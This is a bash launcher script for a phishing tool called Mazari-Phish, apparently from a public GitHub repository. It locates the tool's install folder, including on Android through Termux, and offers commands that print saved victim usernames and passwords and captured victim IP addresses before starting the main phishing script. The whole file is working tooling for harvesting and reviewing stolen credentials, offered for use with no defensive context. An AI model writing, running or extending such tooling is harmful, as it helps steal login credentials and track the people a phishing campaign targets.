#!/bin/bash

# https://github.com/MAZARITECH/Mazari-Phising-Tool

if [[ $(uname -o) == *'Android'* ]]; then
    MAZARI_ROOT="/data/data/com.termux/files/usr/opt/mazari-phish"
else
    export MAZARI_ROOT="/opt/mazari-phish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
    echo "To run Mazari-Phish, type \`mazari-phish\` in your terminal"
    echo
    echo "Help:"
    echo " -h | help : Print this menu & Exit"
    echo " -c | auth : View Saved Credentials"
    echo " -i | ip   : View Saved Victim IP"
    echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
    cat $MAZARI_ROOT/auth/usernames.dat 2> /dev/null || { 
        echo "No Credentials Found !"
        exit 1
    }
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
    cat $MAZARI_ROOT/auth/ip.txt 2> /dev/null || {
        echo "No Saved IP Found !"
        exit 1
    }
else
    cd $MAZARI_ROOT
    bash ./mazari-phish.sh
fi
